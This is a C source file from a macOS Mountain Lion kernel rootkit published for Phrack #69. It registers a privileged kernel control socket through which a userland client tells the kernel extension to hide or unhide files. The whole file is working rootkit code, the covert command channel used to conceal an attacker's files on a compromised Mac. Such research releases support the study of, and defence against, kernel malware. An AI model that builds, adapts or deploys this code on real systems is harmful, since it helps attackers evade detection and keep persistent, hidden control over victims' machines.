/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * kernel_control.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "kernel_control.h"

#include <sys/conf.h>
#include <sys/kernel.h>
#include <string.h>
#include <sys/systm.h>
#include <stdbool.h>
#include <sys/param.h>
#include <stdint.h>
#include <sys/kern_control.h>

#include "shared_data.h"
#include "my_data_definitions.h"
#include "configuration.h"
#include "hide_files.h"

static int ctl_connect(kern_ctl_ref ctl_ref, struct sockaddr_ctl *sac, void **unitinfo);
static errno_t ctl_disconnect(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo);
static int ctl_get(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t *len);
static int ctl_set(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t len);

// globals
static int g_max_clients;
static kern_ctl_ref g_ctl_ref;
static u_int32_t g_client_unit = 0;
static kern_ctl_ref g_client_ctl_ref = NULL;
static boolean_t g_kern_ctl_registered = FALSE;

#pragma mark Kernel Control struct and handler functions

// described at Network Kernel Extensions Programming Guide
static struct kern_ctl_reg g_ctl_reg = {
	BUNDLE_ID,            /* use a reverse dns name which includes a name unique to your comany */
	0,				   	  /* set to 0 for dynamically assigned control ID - CTL_FLAG_REG_ID_UNIT not set */
	0,					  /* ctl_unit - ignored when CTL_FLAG_REG_ID_UNIT not set */
	CTL_FLAG_PRIVILEGED,  /* privileged access required to access this filter */
	0,					  /* use default send size buffer */
	0,                    /* Override receive buffer size */
	ctl_connect,		  /* Called when a connection request is accepted */
	ctl_disconnect,		  /* called when a connection becomes disconnected */
	NULL,				  /* ctl_send_func - handles data sent from the client to kernel control - not implemented */
	ctl_set,			  /* called when the user process makes the setsockopt call */
	ctl_get			 	  /* called when the user process makes the getsockopt call */
};

#pragma mark The start and stop functions

kern_return_t
install_kern_control(void)
{
    errno_t error = 0;
    // register the kernel control
    error = ctl_register(&g_ctl_reg, &g_ctl_ref);
    if (error == 0)
    {
        g_kern_ctl_registered = TRUE;
        return KERN_SUCCESS;
    }
    else
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Failed to install kernel control!\n");
#endif
        return KERN_FAILURE;
    }
}

kern_return_t
remove_kern_control(void)
{
    errno_t error = 0;
    // remove kernel control
    error = ctl_deregister(g_ctl_ref);
    switch (error)
    {
        case 0:
            return KERN_SUCCESS;
        case EINVAL:
        {
#if DEBUG
            //moony_modify//printf("[ERROR] The kernel control reference is invalid.\n");
#endif
            return KERN_FAILURE;
        }
        case EBUSY:
        {
#if DEBUG
            //moony_modify//printf("[ERROR] The kernel control has clients still attached.\n");
#endif
            return KERN_FAILURE;
        }
        default:
            return KERN_FAILURE;
    }
}

#pragma mark Queue function(s)

/*
 * get data ready for userland to grab
 * XXX: not being used for anything and only enqueuing the PID
 */
kern_return_t
queue_userland_data(pid_t pid)
{
    errno_t error = 0;
    
    if (g_client_ctl_ref == NULL) return KERN_FAILURE;
    
    error = ctl_enqueuedata(g_client_ctl_ref, g_client_unit, &pid, sizeof(pid_t), 0);
#if DEBUG
    if (error)
        //moony_modify//printf("[ERROR] ctl_enqueuedata failed with error: %d\n", error);
#endif
    return error;
}

#pragma mark Kernel Control handler functions

/*
 * called when a client connects to the socket
 * we need to store some info to use later
 */
static int
ctl_connect(kern_ctl_ref ctl_ref, struct sockaddr_ctl *sac, void **unitinfo)
{
    // we only accept a single client
    if (g_max_clients > 0) return EBUSY;
    g_max_clients++;
    // store the unit id and ctl_ref of the client that connected
    // we will need these to queue data to userland
    g_client_unit = sac->sc_unit;
    g_client_ctl_ref = ctl_ref;
    return 0;
}

/*
 * and when client disconnects
 */
static errno_t
ctl_disconnect(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo)
{
    // reset some vars
    g_max_clients = 0;
    g_client_unit = 0;
    g_client_ctl_ref = NULL;
    return 0;
}

/*
 * send data from kernel to userland
 * XXX: not used here
 */
static int
ctl_get(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t *len)
{
    int		error = 0;
	size_t  valsize;
	void    *buf = NULL;
	switch (opt)
    {
        case 0:
            valsize = 0;
            break;
        default:
            error = ENOTSUP;
            break;
    }
    if (error == 0)
    {
        *len = valsize;
        if (data != NULL) bcopy(buf, data, valsize);
    }
    return error;
}

/*
 * send data from userland to kernel
 * this is how userland apps adds and removes apps to be suspended
 * XXX: we could also use this for some kind of client authentication
 */
static int
ctl_set(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t len)
{
    int error = 0;
    
    // XXX: add some kind of error checking to the input data?
    //      for example MAX_PATH_LEN
	switch (opt)
	{
        case HIDE_FILE:
        {
            if (len > 0 && data != NULL)
            {
                if (add_file_to_hide((char*)data)) return EINVAL;                
            }
            else
            {
#if DEBUG
                //moony_modify//printf("[ERROR] Invalid data to hide_file command?\n");
#endif
                error = EINVAL;
            }
            break;
        }
        case UNHIDE_FILE:
        {
            if (len > 0 && data != NULL)
            {
                if (del_file_to_hide((char*)data)) return EINVAL;
            }
            else
            {
#if DEBUG
                //moony_modify//printf("[ERROR] Invalid data to unhide_file command?\n");
#endif
                error = EINVAL;
            }
            
            break;
        }
        default:
            error = ENOTSUP;
            break;
    }
    return error;
}
